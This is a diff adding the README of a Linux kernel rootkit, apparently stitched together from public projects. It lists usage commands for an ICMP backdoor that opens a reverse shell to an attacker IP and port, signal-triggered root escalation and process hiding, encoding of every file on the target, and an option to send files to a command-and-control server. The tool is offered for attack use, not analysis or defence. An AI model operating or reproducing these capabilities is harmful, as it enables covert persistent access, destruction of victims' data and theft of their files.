@@ -1,0 +1,13 @@
+This rootkit is a fusion from different projects I looked at and is used to get: a persistent icmp backdoor, root access, process hiding, file encoder, directory and file hiding.
+
+usage:
+get a reverse shell by running borg_locutus/trigger.sh <target ip> <attacker ip> <attacker port>
+get root by using kill -64 $RANDOM
+hide a process by using kill -63 pid
+encode all files on the target with kill -62 $RANDOM 
+you can even extend the encoder to send all interesting files to a c2. To do this you need to change: c2_addr, c2_port in enc.py
+
+https://github.com/MatthiasCr/LKM-Rootkit
+https://github.com/m0nad/Diamorphine
+https://xcellerator.github.io/posts/
+https://github.com/sysprog21/lkm-hidden
